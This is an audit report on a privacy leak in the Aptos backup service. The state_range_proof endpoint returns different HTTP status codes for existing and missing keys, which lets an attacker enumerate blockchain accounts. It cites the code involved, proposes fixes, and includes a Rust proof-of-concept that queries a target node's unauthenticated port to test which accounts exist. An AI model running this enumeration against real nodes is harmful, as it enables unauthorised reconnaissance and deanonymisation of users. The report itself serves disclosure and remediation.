# Audit Report

## Title
Privacy Leak via State Key Enumeration Through Backup Service state_range_proof Endpoint

## Summary
The backup service's `state_range_proof` endpoint leaks information about which state keys exist by returning different HTTP status codes for existing versus non-existing keys. An attacker with access to this endpoint can binary search through the state key space to enumerate which accounts exist on the blockchain, compromising user privacy.

## Finding Description
The vulnerability exists in the interaction between the publicly-exposed backup service endpoint and the underlying Jellyfish Merkle tree proof generation logic.

**Vulnerable Code Path:**

1. The backup service exposes the endpoint at `/state_range_proof/<version>/<end_key>` [1](#0-0) 

2. This calls `BackupHandler.get_account_state_range_proof()` [2](#0-1) 

3. Which delegates to `JellyfishMerkleTree.get_range_proof()` [3](#0-2) 

4. The `get_range_proof` function **explicitly requires that the queried key exists**, failing with an error if it doesn't: [4](#0-3) 

5. Errors are converted to HTTP 500 responses: [5](#0-4) 

**Attack Scenario:**

In production deployments, the backup service is configured to listen on `0.0.0.0:6186`: [6](#0-5) 

While the default is localhost-only: [7](#0-6) 

The production configuration exposes it publicly if not firewalled. There is **no application-level authentication** on the backup service.

An attacker can:
1. Systematically enumerate account addresses (0x1, 0x2, ... 0xN)
2. For each address, construct a `StateKey` for a common resource (e.g., `0x1::account::Account`)
3. Compute the `HashValue` of that StateKey
4. Query `GET /state_range_proof/<version>/<hash_value>`
5. Observe the response:
   - HTTP 200 → Account exists
   - HTTP 500 with "rightmost_key_to_prove must exist." → Account doesn't exist

This allows binary searching through the entire state key space to map which accounts have been created.

## Impact Explanation
This is a **Low severity** privacy leak as explicitly categorized in the security question. Per the Aptos bug bounty criteria, this falls under "Minor information leaks" (up to $1,000).

**Privacy Harm:**
- Attackers can determine which account addresses have been created on the blockchain
- This information could be correlated with on-chain activity for deanonymization
- Account creation patterns could be analyzed to infer user behavior

**Why Not Higher Severity:**
- No funds at risk
- No consensus/safety violations
- No availability impact
- No state corruption
- Only information disclosure

## Likelihood Explanation
**Likelihood: High** - if the backup service is exposed publicly.

**Factors:**
- The attack requires only unauthenticated HTTP GET requests
- Production fullnode configurations expose the service on `0.0.0.0:6186`
- No rate limiting or authentication is implemented
- The binary search is straightforward to implement
- An attacker can enumerate millions of accounts efficiently

**Mitigating Factors:**
- Many deployments may firewall port 6186
- The backup service is intended for internal/trusted use
- The default configuration binds to localhost only

## Recommendation

**Option 1: Return Non-Existence Proofs (Preferred)**

Modify `get_range_proof` to support non-existing keys by returning valid sparse merkle non-existence proofs instead of failing: [4](#0-3) 

Remove the `ensure!(account.is_some(), ...)` check and allow the function to return proofs for both existing and non-existing keys. The underlying `get_with_proof` already supports non-existence proofs.

**Option 2: Implement Authentication**

Add application-level authentication to the backup service, similar to the admin service authentication mechanism.

**Option 3: Uniform Response**

Always return HTTP 200 with a valid response structure, regardless of whether the key exists. This prevents status code-based enumeration.

**Option 4: Rate Limiting**

Implement aggressive rate limiting on the backup service endpoints to make large-scale enumeration impractical.

## Proof of Concept

```rust
// PoC demonstrating the enumeration attack
use aptos_crypto::HashValue;
use aptos_types::account_address::AccountAddress;
use aptos_types::state_store::state_key::StateKey;
use move_core_types::language_storage::StructTag;
use std::str::FromStr;

#[tokio::main]
async fn main() {
    let backup_service_url = "http://<target-node>:6186";
    let version = 1000000; // Some recent version
    
    // Define the Account resource struct tag
    let account_struct_tag = StructTag::from_str("0x1::account::Account")
        .expect("Invalid struct tag");
    
    // Test various account addresses
    for i in 1..=100 {
        let address = AccountAddress::from_hex_literal(&format!("0x{:x}", i))
            .expect("Invalid address");
        
        // Construct StateKey for the Account resource at this address
        let state_key = StateKey::resource(&address, &account_struct_tag)
            .expect("Failed to create state key");
        
        // Get the hash value (used as the Merkle tree key)
        let hash_value = state_key.crypto_hash_ref();
        
        // Query the backup service
        let url = format!(
            "{}/state_range_proof/{}/{}",
            backup_service_url,
            version,
            hash_value.to_hex()
        );
        
        match reqwest::get(&url).await {
            Ok(response) if response.status().is_success() => {
                println!("✓ Account 0x{:x} EXISTS", i);
            }
            Ok(response) if response.status() == 500 => {
                println!("✗ Account 0x{:x} does not exist", i);
            }
            Err(e) => {
                println!("? Account 0x{:x} - Error: {}", i, e);
            }
            _ => {}
        }
    }
}
```

**Notes:**

1. **Backup Service Exposure**: The vulnerability is only exploitable when the backup service is configured to listen on a publicly accessible address (`0.0.0.0:6186`), which is the case in production fullnode configurations.

2. **Design vs Implementation**: The underlying `get_with_proof` function in the Jellyfish Merkle tree already supports returning non-existence proofs. The vulnerability is introduced by the explicit check in `get_range_proof` that requires the key to exist.

3. **Severity Justification**: While this is categorized as Low severity, it represents a real privacy concern. The ability to enumerate all accounts on the blockchain compromises user privacy and could enable targeted attacks or surveillance.

4. **Default Security**: The default configuration (localhost binding) is secure, but production deployments override this for operational reasons, exposing the vulnerability.

### Citations

**File:** storage/backup/backup-service/src/handlers/mod.rs (L35-45)
```rust
    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L165-172)
```rust
    pub fn get_account_state_range_proof(
        &self,
        rightmost_key: HashValue,
        version: Version,
    ) -> Result<SparseMerkleRangeProof> {
        self.state_store
            .get_value_range_proof(rightmost_key, version)
    }
```

**File:** storage/aptosdb/src/state_store/mod.rs (L748-755)
```rust
    /// Gets the proof that proves a range of accounts.
    pub fn get_value_range_proof(
        &self,
        rightmost_key: HashValue,
        version: Version,
    ) -> Result<SparseMerkleRangeProof> {
        self.state_merkle_db.get_range_proof(rightmost_key, version)
    }
```

**File:** storage/jellyfish-merkle/src/lib.rs (L800-824)
```rust
    /// Gets the proof that shows a list of keys up to `rightmost_key_to_prove` exist at `version`.
    pub fn get_range_proof(
        &self,
        rightmost_key_to_prove: HashValue,
        version: Version,
    ) -> Result<SparseMerkleRangeProof> {
        let (account, proof) = self.get_with_proof(rightmost_key_to_prove, version)?;
        ensure!(account.is_some(), "rightmost_key_to_prove must exist.");

        let siblings = proof
            .siblings()
            .iter()
            .zip(rightmost_key_to_prove.iter_bits())
            .filter_map(|(sibling, bit)| {
                // We only need to keep the siblings on the right.
                if !bit {
                    Some(*sibling)
                } else {
                    None
                }
            })
            .rev()
            .collect();
        Ok(SparseMerkleRangeProof::new(siblings))
    }
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L82-91)
```rust
/// Return 500 on any error raised by the request handler.
pub(super) fn unwrap_or_500(result: DbResult<Box<dyn Reply>>) -> Box<dyn Reply> {
    match result {
        Ok(resp) => resp,
        Err(e) => {
            warn!("Request handler exception: {:#}", e);
            Box::new(warp::http::StatusCode::INTERNAL_SERVER_ERROR)
        },
    }
}
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L67-68)
```yaml
storage:
  backup_service_address: "0.0.0.0:6186"
```

**File:** config/src/config/storage_config.rs (L433-436)
```rust
impl Default for StorageConfig {
    fn default() -> StorageConfig {
        StorageConfig {
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```
